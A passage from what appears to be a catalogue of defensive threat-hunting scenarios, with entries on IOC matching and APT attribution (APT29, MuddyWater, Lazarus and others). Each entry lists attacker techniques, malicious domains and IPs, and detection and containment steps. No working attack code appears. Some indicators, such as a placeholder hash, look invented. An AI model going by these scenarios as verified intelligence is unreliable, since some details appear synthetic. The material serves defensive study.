- **Attack Steps**: 1. User reports phishing email with attachment conference_invite.exe. 2. The attachment is hashed and correlated with MISP where it links to a broader spear-phishing campaign by APT28. 3. Subject lines and attachment names are added to YARA rules for retro-hunting. 4. Email gateway logs show 7 similar messages delivered within the last 3 days. 5. IR team identifies two users who opened the attachments, triggering beaconing activity. 6. Full endpoint scans and memory dumps confirm staged payloads awaiting activation. 7. Email IOC signatures are hardened, campaign details logged into internal threat feed, and shared with national CERT.
- **Detection**: Email Gateway, MISP
- **Solution**: Prevents escalation to payload stage
- **Tags**: #aptlure #iocsharing

## IOC Match for Malicious Domain via Passive DNS Pivot

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Passive DNS domain match
- **MITRE**: T1071.004
- **Impact**: C2 domain confirms staged compromise
- **Tools**: PassiveTotal, SecurityTrails, MISP, SIEM
- **Scenario**: Using passive DNS, analysts match beacon domain to known C2
- **Attack Steps**: 1. Proxy logs show consistent outbound DNS queries to update-checks[.]info. 2. Analysts use PassiveTotal to pivot historical resolutions and see IP overlaps with domains in MISP. 3. The domain is listed in a recent TA505 campaign. 4. Email correlation reveals a phishing lure sent 48 hours prior. 5. Analysts extract browser history and find the C2 page was accessed automatically by a dropper. 6. The IOC match triggers endpoint scans, domain is added to proxy denylist, and an alert rule is created in SIEM. 7. Summary IOC package is created and exported to internal TI platform.
- **Detection**: DNS, PassiveTotal
- **Solution**: Quick domain takedown and detection
- **Tags**: #passivedns #iocintel

## Hash IOC Match via YARA Scan Finds Dormant Loader

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: DLL sideloader detected pre-execution
- **MITRE**: T1574.002
- **Impact**: Prevents loader execution before activation
- **Tools**: YARA, MISP, CrowdStrike, Autoruns
- **Scenario**: YARA scan for a known hash reveals dormant malware in software temp directory
- **Attack Steps**: 1. Threat feed includes YARA signature for loader_x_v2.exe used in DLL sideloading attacks. 2. YARA scan across temp directories detects match on inactive endpoint. 3. The hash matches MISP IOC with ties to FIN7 campaigns. 4. File is found in C:\ProgramData\SoftwareUpdater\. 5. Autoruns confirms it is set to execute via RunOnce registry key. 6. CrowdStrike confirms file has not executed yet. 7. Analysts quarantine file, delete RunOnce key, and use IOC to hunt across additional systems.
- **Detection**: YARA, Autoruns
- **Solution**: Stops pre-stage malware execution
- **Tags**: #yaramatch #dllsideloading

## IOC Enrichment of Blocked Domain Shows Ties to Malware-as-a-Service

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Malware-as-a-Service infra match
- **MITRE**: T1583.001
- **Impact**: Prevents re-infection from infra clusters
- **Tools**: URLhaus, AlienVault, Splunk, ThreatFox
- **Scenario**: IOC analysis of a blocked domain leads to discovery of MaaS infrastructure
- **Attack Steps**: 1. DNS sinkhole logs show multiple blocked connections to syncupserver[.]net. 2. Analysts enrich the domain via URLhaus and find it linked to a MaaS distribution network (IcedID). 3. ThreatFox confirms 13 other domains using same C2 panel signature. 4. WHOIS and SSL cert fingerprinting reveal all hosted on same VPS range. 5. Splunk retrohunt shows initial beacon from a system that downloaded invoice_reader.docm. 6. IOC set is shared with CERT and other partners. 7. Domain is added to permanent blocklist and abuse reports filed.
- **Detection**: URLhaus, DNS, ThreatFox
- **Solution**: Disrupts MaaS ecosystem
- **Tags**: #maas #ioccluster

## Correlating File Hash and Command & Control IP in IOC Triangulation

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Dual-IOC triangulation
- **MITRE**: T1055.012
- **Impact**: Correlation confirms multistage compromise
- **Tools**: MISP, VirusTotal, Suricata, Sysmon
- **Scenario**: Analysts correlate a file hash and an IP from two separate alerts, confirming active compromise
- **Attack Steps**: 1. Suricata detects outbound connection to 84.45.12.33. 2. A separate host alerts on execution of suspicious javaw.exe. 3. Analysts hash the EXE and submit to MISP – returns linked to same campaign as the IP (RedLine Stealer). 4. Sysmon confirms both hosts accessed the same malware C2 over two days. 5. Lateral movement attempts are identified. 6. IOC set is submitted to all security tooling for proactive blocks. 7. Malware family behaviors are added to MITRE mapping dashboard for future enrichment.
- **Detection**: Suricata, MISP, Sysmon
- **Solution**: High-confidence infection validation
- **Tags**: #iocfusion #hashipmatch

## Malicious Redirect Domain Detected via IOC Feed and Browser Artifacts

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Redirector domain IOC detection
- **MITRE**: T1189
- **Impact**: Drive-by redirect via malvertisement
- **Tools**: MISP, Proxy Logs, Chrome History Viewer, Suricata
- **Scenario**: A redirector domain embedded in fake ad campaigns is flagged via IOC correlation
- **Attack Steps**: 1. SOC receives MISP update containing tracking-news[.]pro linked to browser hijackers. 2. Proxy logs show multiple outbound HTTP GET requests to this domain from a finance department host. 3. Chrome browser artifacts confirm the domain was loaded via a malicious embedded ad on a PDF search site. 4. Analysts extract browsing history and find similar behavior on two other machines. 5. Suricata logs show potential redirect to download-me-now[.]xyz — also listed in Abuse.ch. 6. IOC is confirmed to be part of a malvertising chain distributing RedLine Stealer. 7. All machines are isolated, IOC set updated across all detection tools, and adblock policies are enforced across enterprise browsers.
- **Detection**: DNS, Proxy, Browser Forensics
- **Solution**: Blocks malicious ads and hidden redirects
- **Tags**: #malvertising #iocbrowser

## Beaconing to IP in TOR Exit Node List Detected via IOC Matching

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: TOR-based C2 infrastructure
- **MITRE**: T1071.004
- **Impact**: Beacon through anonymity network
- **Tools**: TOR Exit Node List, MISP, Netflow, Wireshark, EDR
- **Scenario**: SOC detects beaconing to TOR exit node IP through correlation with IOC list
- **Attack Steps**: 1. An endpoint triggers unusual outbound traffic during non-working hours to IP 45.129.56.202. 2. TOR exit node feed confirms the IP belongs to an active relay. 3. MISP further matches the IP to several C2 operations conducted via hidden services. 4. Netflow analysis shows persistent connections every 5 minutes from a single host. 5. Memory dump reveals an unknown process cryptproxy.exe masquerading as a Windows service. 6. Wireshark confirms encrypted HTTP headers matching known obfuscation patterns used in LokiBot campaigns. 7. IOC is used to enrich dashboards and scan for similar behavioral fingerprints across estate.
- **Detection**: TOR Feed, MISP, Memory Forensics
- **Solution**: Detects obfuscated outbound C2
- **Tags**: #torc2 #iocinfra

## C2 Domain Found via Email Link IOC Matched to ThreatFox

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Phishing URL leading to asyncRAT
- **MITRE**: T1566.002
- **Impact**: Malicious URL used in lure mail
- **Tools**: ThreatFox, SIEM, Email Gateway, Proxy Logs
- **Scenario**: Malicious domain embedded in phishing email links directly to known C2
- **Attack Steps**: 1. A user forwards a suspicious email with link to mybenefit-check[.]xyz. 2. ThreatFox feed confirms the domain belongs to an active asyncRAT campaign. 3. Analysts check URL sandbox detonation and observe C2 beacon post form submission. 4. SIEM log correlation reveals that four other users clicked the link, triggering outbound POST requests. 5. Proxy and EDR logs reveal stage-1 EXE download with the same hash on all machines. 6. IOC is used to scan backward across 30 days of mail logs and proxy records. 7. Firewall rules are updated, the domain is blocked across all secure web gateways, and phishing awareness alerts are sent organization-wide.
- **Detection**: ThreatFox, Email Logs
- **Solution**: Blocks malware delivery via enriched IOC
- **Tags**: #phishingurl #ioclink

## CoinMiner Registry Persistence Discovered via Hash IOC

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Crypto-miner registry persistence
- **MITRE**: T1547.001
- **Impact**: Startup persistence via Run key
- **Tools**: VirusTotal, FTK Imager, Autoruns, CrowdStrike
- **Scenario**: Known miner binary hash linked to registry autorun key for persistence
- **Attack Steps**: 1. Miner hash received via MISP and VirusTotal intelligence feed. 2. YARA rule run across endpoint binaries matches hash to wsmprovhost.exe. 3. FTK Imager reveals registry Run key with path pointing to this binary. 4. CrowdStrike telemetry shows consistent CPU spike and outbound port 3333 traffic. 5. Memory artifacts confirm execution of XMRig miner variant with encrypted config. 6. IOC match leads to 12 other hosts with same binary and registry keys. 7. IR team quarantines machines, deletes autorun registry entries, and applies group policy to monitor Run key creation in real-time.
- **Detection**: VT, MISP, Registry Analysis
- **Solution**: Eliminates low-visibility persistence
- **Tags**: #hashpersistence #cryptominer

## Hash Match Reveals Side-Loaded Malicious DLL in Legit App Folder

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: DLL sideloading via hash match
- **MITRE**: T1574.002
- **Impact**: Fake DLL loaded via trusted path
- **Tools**: MISP, VirusTotal, PEStudio, Autoruns
- **Scenario**: IOC hash links libcrypto.dll to banking trojan delivered via DLL sideloading
- **Attack Steps**: 1. Antivirus alert for unsigned DLL in C:\Program Files\DocView\libcrypto.dll. 2. The hash is submitted to VirusTotal, showing 38/70 positive matches linked to Gozi Trojan. 3. MISP confirms linkage to DLL sideloading campaign targeting document viewers. 4. PEStudio reveals exported functions mimicking real OpenSSL library but with added init_shell(). 5. Autoruns lists the legitimate app executing this DLL at startup. 6. Memory forensics reveals shellcode injection triggered post-execution. 7. IOC triggers search for similarly misused DLLs across document management systems in enterprise.
- **Detection**: VT, MISP, Autoruns
- **Solution**: Exposes trojan masquerading as lib
- **Tags**: #dllsideload #hashmatch

## Multi-Stage Malware Delivery Traced via Matched Dropper Hash

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Multi-stage dropper linked to IOC
- **MITRE**: T1204.002
- **Impact**: Dropper leads to multi-level payloads
- **Tools**: VirusTotal, Any.Run, CrowdStrike, MISP
- **Scenario**: Hash match for dropper reveals embedded payloads staged over time
- **Attack Steps**: 1. Suspicious setup_vpn.exe flagged by AV as generic. 2. Hash submitted to VT and matches known AgentTesla dropper with macro-based delivery. 3. Any.Run shows second-stage download from pastebin[.]com/raw/z32wA. 4. CrowdStrike confirms HTTP POST beacons to 85.124.19.221. 5. MISP confirms entire kill chain including file hash, IP, domain, and mutex patterns. 6. IOC match triggers containment of infected hosts and full memory scans. 7. Threat intel dashboard updated with full chain-of-custody linked to IOCs for proactive hunting.
- **Detection**: VT, MISP, Any.Run
- **Solution**: Complete compromise traced via hash
- **Tags**: #dropperhash #malwareioc

## APT Domain from STIX Feed Cross-Matched in Proxy Logs

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: APT29 domain IOC match
- **MITRE**: T1071.003
- **Impact**: Encrypted C2 session detected
- **Tools**: STIX, TAXII Client, Proxy Logs, MISP, Wireshark
- **Scenario**: STIX feed reveals domain linked to APT29; detected in internal browsing activity
- **Attack Steps**: 1. STIX feed includes IOC for domain control-portal[.]net tied to APT29 C2. 2. TAXII client ingests and normalizes IOC into internal threat platform. 3. Proxy logs show 2 hosts resolved and accessed this domain last week. 4. Wireshark confirms TLS handshake initiated using self-signed certificate. 5. MISP correlates the domain with previously reported Russian-origin malware WellMess. 6. Both systems are isolated, memory captured, and IOC shared with ISAC. 7. Access to all *.control-portal.net domains blocked at DNS and firewall.
- **Detection**: STIX, Proxy, MISP
- **Solution**: Prevents long-term foothold via IOCs
- **Tags**: #stixioc #apt29

## IOC Match in ThreatFox Shows IP Hosting Multiple Malware Kits

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Malware delivery server
- **MITRE**: T1583.008
- **Impact**: Prevents re-infection from single IP
- **Tools**: ThreatFox, Nmap, VirusTotal, Abuse.ch, Shodan
- **Scenario**: ThreatFox reveals IP address is serving multiple infostealers and exploit kits
- **Attack Steps**: 1. Daily IOC feed flags 142.11.2.99 as malware server. 2. Nmap scan shows open HTTP, FTP, and SMB services. 3. VirusTotal confirms presence of RedLine, Vidar, and FormBook binaries. 4. Shodan reveals outdated Apache 2.2 and PHP 5.4 stack. 5. Proxy logs show 8 internal hosts accessed this IP. 6. All traffic to this IP is blocked and affected systems scanned. 7. IOC added to Splunk dashboards and shared with CERT team for takedown.
- **Detection**: VT, ThreatFox, Nmap
- **Solution**: Blocks access to entire malware cluster
- **Tags**: #ipmatch #infostealers

## Executable Hash Matched in Custom TI Platform During Threat Hunt

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Dormant malware detected via IOC
- **MITRE**: T1056.001
- **Impact**: Prevents re-activation of keylogger
- **Tools**: Velociraptor, MISP, TI Platform, Autoruns
- **Scenario**: IOC hash match during offline threat hunt uncovers dormant keylogger
- **Attack Steps**: 1. Threat hunt team runs Velociraptor hash-sweep using custom TI feed. 2. Match found on inactive endpoint for readerapp.exe. 3. MISP confirms hash tied to NetWire keylogger. 4. Binary resides in AppData\Roaming with scheduled task for execution. 5. Autoruns reveals hidden startup entry via Windows Script Host. 6. No recent execution, but prefetch reveals previous runs last month. 7. IOC alert triggers full forensics, and startup logic is deleted.
- **Detection**: MISP, Velociraptor
- **Solution**: Catches stealth persistence before use
- **Tags**: #dormantioc #keylogger

## IOC Matching Detects DNS Tunneling Attempt via Known Domain

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Cross-platform
- **Vulnerability**: DNS tunneling via IOC domain
- **MITRE**: T1071.004
- **Impact**: C2 exfiltration via DNS tunnel
- **Tools**: DNS Logs, ThreatFox, Zeek, Firewall
- **Scenario**: Domain used for DNS tunneling caught via match with threat intel feed
- **Attack Steps**: 1. DNS logs show frequent TXT record queries to c2connect[.]xyz. 2. ThreatFox feed confirms domain used in DNS tunneling campaign. 3. Zeek detects abnormal DNS query length and frequency. 4. Firewall logs show small beaconing traffic every 30 seconds. 5. Analysts extract payload via base64 decoding from TXT records. 6. Match confirms connection to Quasar RAT infrastructure. 7. Domain is blocked in DNS sinkhole, and IOC shared with upstream DNS provider.
- **Detection**: DNS, ThreatFox, Zeek
- **Solution**: Stops low-noise covert exfiltration
- **Tags**: #dnstunnel #iocdns

## IOC Match Reveals Archived ZIP File Containing Weaponized Excel Macro

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Hash-based macro detection
- **MITRE**: T1566.001
- **Impact**: Macro attack embedded in Excel inside ZIP
- **Tools**: VirusTotal, MISP, Email Gateway, Excel4 Macro Analyzer
- **Scenario**: IOC match on a hash extracted from an archived ZIP file containing macro-laced Excel sheet
- **Attack Steps**: 1. A suspicious ZIP file is attached in a phishing email and delivered to a senior executive. 2. The ZIP is detonated in a sandbox where salary_breakup.xlsx is extracted. 3. The SHA256 hash of the Excel file is submitted to MISP and matches a known Emotet-laced macro document. 4. Further static analysis reveals embedded Excel 4.0 macros invoking cmd.exe and PowerShell for payload delivery. 5. VirusTotal confirms this hash as associated with Emotet campaigns targeting HR departments globally. 6. Analysts retrieve similar attachments from email logs and correlate hashes across internal storage. 7. IOC is used to auto-delete matching files on mail servers, revoke access tokens, and apply advanced macro-blocking policies.
- **Detection**: Email Gateway, MISP, Excel4
- **Solution**: Stops payload execution from phishing ZIP
- **Tags**: #hashmacro #iocexcel

## IOC Match in Proxy Logs Detects Domain Abuse for Ransomware Drop

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Ransomware staging via domain match
- **MITRE**: T1486
- **Impact**: Domain acts as malware drop point
- **Tools**: ThreatFox, Proxy Logs, Suricata, Splunk
- **Scenario**: Domain used in drive-by download attack drops ransomware payload; match found via IOC feed
- **Attack Steps**: 1. IOC update from ThreatFox flags domain secure-docshare[.]org tied to LockBit ransomware staging. 2. Proxy logs reveal outbound requests to the domain from a legal team workstation. 3. Suricata alerts confirm the domain served suspicious .exe payload disguised as legal notice. 4. Analysts pivot using Splunk and identify other users who accessed similar fake document URLs. 5. URL is detonated and confirms drop of legalnotice_update.exe with obfuscated logic. 6. IOC feed is updated across the proxy, DNS, and email filters. 7. Forensic investigation confirms pre-execution of ransomware component and triggers containment.
- **Detection**: Proxy, Suricata
- **Solution**: Blocks ransomware before encryption stage
- **Tags**: #lockbit #iocdomain

## IOC Match in Suricata Alerts Uncovers Exploit Kit Activity via IP

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: IP-linked exploit kit detection
- **MITRE**: T1203
- **Impact**: Browser exploited via embedded script
- **Tools**: Suricata, MISP, Netflow, Zeek
- **Scenario**: Suricata triggers match against IP linked to RIG exploit kit in IOC feed
- **Attack Steps**: 1. Suricata triggers alert for outbound connection to 192.210.192.17. 2. MISP feed confirms this IP is linked to recent RIG exploit kit campaigns. 3. Netflow logs confirm beaconing patterns with periodic traffic to the same IP on port 443. 4. Zeek extracts encrypted payload attempts and SSL fingerprints that match RIG behavior. 5. Analysts perform timeline correlation to confirm exploitation of browser vulnerability during PDF view. 6. IOC-driven scan identifies 4 other hosts with same traffic patterns. 7. Domain and IP are blocked at all layers, and a patch advisory is sent for browsers across the enterprise.
- **Detection**: Suricata, MISP, Netflow
- **Solution**: Prevents multi-stage malware delivery
- **Tags**: #rigek #iocip

## IOC Match on Malicious PowerShell One-Liner Observed in Obfuscated Script

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: PowerShell hash pattern match
- **MITRE**: T1059.001
- **Impact**: Detects weaponized PowerShell via hash
- **Tools**: PowerShell Logs, MISP, VirusTotal, CyberChef
- **Scenario**: Analysts extract obfuscated PowerShell, hash its decoded string, and match against IOC feed
- **Attack Steps**: 1. EDR flags obfuscated PowerShell launched via cmd.exe /c. 2. Analysts decode script using CyberChef and extract base64 payload invoking Invoke-Expression with external call. 3. The decoded script’s hash matches known malicious one-liner in MISP linked to NanoCore RAT delivery. 4. VirusTotal shows this pattern used in over 100 phishing incidents. 5. Analysts pivot to correlate which users triggered this payload and find macro-based email origin. 6. The IOC triggers block rule in PowerShell logging pipeline for similar patterns. 7. User machines are rescanned, macro-blocking policies enforced, and IOC shared with IR partners.
- **Detection**: PowerShell, MISP, CyberChef
- **Solution**: Blocks dynamic code execution early
- **Tags**: #powershellioc #hashdetect

## IOC Match in DNS Logs Reveals DGA-Based Malware Communication

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: DGA-based IOC domain matching
- **MITRE**: T1568.002
- **Impact**: Detects stealthy C2 using DGA
- **Tools**: DNS Logs, DGArchive, Splunk, ThreatFox
- **Scenario**: Malware using Domain Generation Algorithm is caught via partial IOC match and statistical anomalies
- **Attack Steps**: 1. DNS logs show repeated queries to domains like kludufuea[.]net, prtdwmuop[.]com. 2. DGArchive confirms pattern aligns with DGA used by QakBot. 3. ThreatFox IOC feed confirms partial match on root domain of one sample. 4. Statistical analysis reveals entropy and TTL values characteristic of algorithmically generated domains. 5. Timeline analysis finds correlation with VBA macro email campaign. 6. All domains are added to threat feed, blocked, and matched against internal IOC aggregator. 7. DGA pattern is used to create YARA rules and SIEM correlation logic.
- **Detection**: DNS Logs, ThreatFox
- **Solution**: Early detection of evasive comms
- **Tags**: #dga #iocdns #qakbot

## IOC Correlation Finds Malicious LNK Shortcut in Public Share

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Malicious shortcut via hash match
- **MITRE**: T1204.002
- **Impact**: Shortcut abused to load malware
- **Tools**: MISP, VirusTotal, Sysmon, Share Access Logs
- **Scenario**: Analysts detect malicious .lnk file in shared drive by correlating its hash to IOC threat feed
- **Attack Steps**: 1. SOC receives IOC hash for .lnk file used by TrickBot. 2. Scheduled scan of shared drives locates file budget-report.lnk in a marketing team folder. 3. VirusTotal confirms match with TrickBot loader shortcut exploiting CVE-2017-11882. 4. Sysmon confirms that the shortcut spawns cmd.exe followed by powershell.exe download from C2 domain. 5. Access logs show the file has been opened by three employees in the last 24 hours. 6. IOC triggers removal of file, block of shortcut execution via GPO, and full scan of affected systems. 7. Policy update includes disabling LNK files from shared drives and user awareness training.
- **Detection**: MISP, Sysmon, VT
- **Solution**: Prevents lateral spread via share
- **Tags**: #trickbot #lnkfile #iocmatch

## IOC Match Detects Stealth Downloader Embedded in ISO Image

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: ISO loader hash match
- **MITRE**: T1566.001
- **Impact**: ISO used to evade AV and deliver loader
- **Tools**: MISP, YARA, ISO Extractor, EDR
- **Scenario**: ISO image file hash matched to known malware loader from IOC feed
- **Attack Steps**: 1. An ISO file named project_planning.iso is received in phishing email and opened by HR staff. 2. The ISO file is extracted and contains a hidden .lnk and upd.dat binary. 3. MISP hash match confirms ISO hash is part of BumbleBee loader campaign. 4. YARA rules validate similarity with previous BumbleBee artifacts. 5. EDR confirms silent execution of payload via shortcut within ISO mount. 6. IOC match leads to immediate containment and reverse engineering of embedded downloader. 7. Enterprise mail gateways are updated to strip ISO attachments for external emails.
- **Detection**: ISO tools, MISP, EDR
- **Solution**: Blocks advanced loader pre-execution
- **Tags**: #bumblebee #iociso

## IOC Enrichment Confirms Suspicious Domain Hosts Fake Office Update Page

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Cross-platform
- **Vulnerability**: Fake updater via domain IOC
- **MITRE**: T1555.003
- **Impact**: Domain impersonates Office update
- **Tools**: ThreatFox, Splunk, Web Proxy, SSL Cert Parser
- **Scenario**: Domain matches feed entry showing it impersonates Microsoft Office update portals
- **Attack Steps**: 1. Proxy alerts show connections to update-ms365[.]info. 2. ThreatFox feed identifies domain as fake Microsoft updater used by GuLoader. 3. SSL cert inspection reveals mismatch in certificate chain and suspicious issuer. 4. Splunk retro-hunt identifies 6 machines that fetched content from this domain. 5. Analysts test the page and observe fake JavaScript triggering payload drop. 6. IOC is used to block domain, redirect traffic for sinkhole analysis, and update alert rules. 7. Training emails are sent warning of fake Microsoft-themed updates.
- **Detection**: Proxy, SSL Logs, ThreatFox
- **Solution**: Prevents social engineering downloads
- **Tags**: #officeupdate #fakepage

## IOC Match Reveals Signed Binary Misuse for Persistence

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Windows
- **Vulnerability**: Signed binary DLL sideload match
- **MITRE**: T1574.002
- **Impact**: Misuse of trusted binary for persistence
- **Tools**: MISP, Autoruns, Sysmon, Sigcheck
- **Scenario**: IOC identifies Microsoft-signed binary abused for side-loading malicious DLL
- **Attack Steps**: 1. IOC feed contains SHA256 of msdt.exe flagged for sideloading scenarios. 2. Analysts scan internal systems and locate usage of msdt.exe outside System32 path. 3. Autoruns shows msdt.exe invoked at logon with custom DLL in same folder. 4. Sysmon logs confirm loading of malicious DLL by trusted binary. 5. Sigcheck validates the binary signature, but location and behavior are abnormal. 6. IOC match prompts removal of both files, review of all LOLBin usage, and update to alert logic for signed binary abuse. 7. Prevention policies block execution of signed binaries from user-writeable paths.
- **Detection**: MISP, Sigcheck
- **Solution**: Stops persistent malware disguised as legit
- **Tags**: #lolbin #msdt #iocdll

## IOC Match Catches Embedded Stealer in Browser Extension

- **Attack Type**: IOC Matching (IP, Hash, Domain)
- **Target**: Cross-platform
- **Vulnerability**: Malicious Chrome extension
- **MITRE**: T1176
- **Impact**: Credential stealing via JS extension
- **Tools**: Chrome Extension Viewer, MISP, ThreatFox, Splunk
- **Scenario**: IOC hash confirms stealer embedded in fake productivity Chrome extension
- **Attack Steps**: 1. Chrome extension hash a1b2c3d4e5 added to IOC feed after being flagged for credential theft. 2. Analysts scan installed browser extensions and find SpeedTabs Boost active on 4 user profiles. 3. MISP confirms hash is tied to OpenGraph stealer campaign. 4. JavaScript inside extension communicates with hardcoded domains on form submissions. 5. Splunk logs reveal exfiltration patterns with session token leaks. 6. IOC match results in enterprise-wide browser extension policy audit. 7. Extension is force-removed and IOC hash pushed to Google Safe Browsing for public warning.
- **Detection**: Browser Logs, ThreatFox
- **Solution**: Prevents session hijacking through UI
- **Tags**: #stealer #chromeioc

## APT29 Attribution Through Custom Malware Loader and Credential Theft

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: LOLBins, Memory Injection
- **MITRE**: T1003.001, T1071.004
- **Impact**: Prevents stealthy exfiltration
- **Tools**: Sysmon, CISA, MITRE ATT&CK, Ghidra, Volatility
- **Scenario**: Analysts correlate memory-resident malware behavior with known APT29 credential theft chain
- **Attack Steps**: 1. Analysts receive alert from EDR indicating suspicious PowerShell activity launched via a legitimate Windows binary (wscript.exe).2. Sysmon confirms wscript.exe spawned a base64-encoded payload invoking Invoke-ReflectivePEInjection. 3. Analysts capture live memory dump and analyze it using Volatility to extract injected module and command-line arguments. 4. The decrypted payload contains encoded strings referencing LSASS and hardcoded mutex "APT29_LoaderAgent". 5. Ghidra disassembly reveals a credential scraping logic from memory handles, mimicking APT29's stealthy credential theft documented in past NSA advisories. 6. DNS logs reveal exfiltration attempts via DNS tunneling to dnslookup-api[.]org. 7. MITRE mapping shows correlation to T1003.001, T1059.001, and T1071.004—commonly used by APT29. 8. Analysts conclude the attack chain is consistent with APT29's previously observed tradecraft, update threat profile, and push IOC signatures across SIEM.
- **Detection**: Memory analysis, DNS logs
- **Solution**: Block LOLBins, monitor LSASS access
- **Tags**: #APT29 #CredentialTheft #Volatility

## MuddyWater Attribution via Custom PowerShell Backdoor with Unique Encoding Scheme

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Encoded PowerShell
- **MITRE**: T1059.001, T1027
- **Impact**: Detects region-specific APT tools
- **Tools**: Any.Run, MITRE Navigator, PowerShell Logs, VirusTotal
- **Scenario**: A custom obfuscated PowerShell payload embedded in a Word doc is linked to MuddyWater group
- **Attack Steps**: 1. A malicious .docx file is opened by a finance employee; macros auto-execute hidden PowerShell payload.2. PowerShell logs reveal obfuscated script using a custom XOR-encoding layer and invoke-expression chain.3. Analysts decode script in CyberChef and find C2 beaconing logic with sleep intervals of 111 seconds—matching known MuddyWater backdoors.4. VirusTotal shows similar variants submitted in Middle East-targeted campaigns.5. MITRE TTPs T1059.001, T1203, and T1027 align with the tactics used in the attack.6. TTP enrichment confirms exact command structure, script encoding, and C2 timing patterns seen in MuddyWater's documented attack chains.7. SOC publishes internal advisory, updates detection rulebase for PowerShell pattern, and adds IOC for continuous monitoring.
- **Detection**: PowerShell Logs, VT
- **Solution**: Decode scripts, monitor script blocks
- **Tags**: #muddywater #powershell #encoding

## Lazarus Group Linked to DLL Sideloading in Supply Chain Software Update

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: DLL Sideloading
- **MITRE**: T1574.002, T1043
- **Impact**: Prevents supply chain malware execution
- **Tools**: MITRE ATT&CK, PEStudio, Sigcheck, Ghidra
- **Scenario**: DLL sideloading observed during software update is linked to Lazarus via toolset and C2 overlap
- **Attack Steps**: 1. A DLL named update.dll is loaded by a legitimate SoftUpdate.exe process signed by a third-party vendor.2. Analysts use Sigcheck to verify signature and PEStudio to inspect DLL export functions—only a single obfuscated RunMain() found.3. Ghidra reverse engineering reveals hardcoded domain used for C2 traffic: koreauplink-node[.]com.4. The IP of this domain overlaps with prior Lazarus-linked infrastructure from CISA alert AA21-048A.5. TTPs including signed-binary proxy execution, custom DLL side-loading, and encrypted config file match Lazarus campaigns.6. MITRE techniques used: T1574.002, T1043, and T1027.7. SOC raises incident to IR and publishes enriched threat profile on Lazarus’ evolving sideload methods.
- **Detection**: Ghidra, PEStudio
- **Solution**: Validate DLL paths, integrity, and source
- **Tags**: #Lazarus #DLLHijack #SupplyChain

## Gamaredon Attribution Using Malicious LNK Chain and Telegram API Abuse

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Telegram C2 via LNK
- **MITRE**: T1102.002, T1204.002
- **Impact**: Detects unconventional C2 vectors
- **Tools**: MITRE ATT&CK, Any.Run, Telegram API Monitor, Sysmon
- **Scenario**: Shortcut file with Telegram C2 communication linked to Gamaredon tactics
- **Attack Steps**: 1. Shortcut file invoice_link.lnk is opened by an employee from a shared folder.2. LNK invokes PowerShell with obfuscated script downloading payload via Telegram Bot API.3. Any.Run sandbox reveals Telegram beaconing and further download of stealer.ps1.4. Sysmon logs confirm PowerShell was spawned via explorer.exe with unusual parameters.5. TTPs are matched with Gamaredon’s behavior involving Telegram as a covert channel.6. MITRE techniques matched: T1204.002, T1059.001, T1102.002.7. IOC enrichment includes Bot API endpoint, shortcut hash, and stealer function chain for future alerting.
- **Detection**: Sysmon, Any.Run
- **Solution**: Monitor shortcut behaviors and APIs
- **Tags**: #Gamaredon #TelegramC2

## APT33 Attribution Through Scripting Pattern and Named Pipe Abuses

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Named Pipe, Fileless Loader
- **MITRE**: T1059.001, T1574.001
- **Impact**: Detects stealthy fileless implants
- **Tools**: EDR, Named Pipe Scanner, MITRE ATT&CK, Ghidra
- **Scenario**: Scripted backdoor with named pipe communication pattern matches APT33 playbook
- **Attack Steps**: 1. A suspicious process backupsvc.exe detected using a custom named pipe \.\pipe\azurebackupchannel.2. Analysts review binary and find script embedded with delayed execution using ping -n 6.3. Ghidra reveals embedded PowerShell block that decrypts to fileless loader.4. C2 communication handled via named pipe with injected process spoolsv.exe—consistent with APT33 TTP.5. Mapping to MITRE shows T1059.001, T1574.001, and T1071.001.6. Threat intelligence correlation reveals shared infrastructure in past OilRig operations.7. IOC set enriched with pipe name, behavior signature, and SED hash to block future variants.
- **Detection**: EDR, Pipe Analysis
- **Solution**: Kill named pipe usage, monitor injection
- **Tags**: #APT33 #Fileless #NamedPipe

## Sidewinder Group Traced via Malformed RTF and Targeted Decoy Docs

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Malformed RTF + CVE Exploit
- **MITRE**: T1203, T1059.001
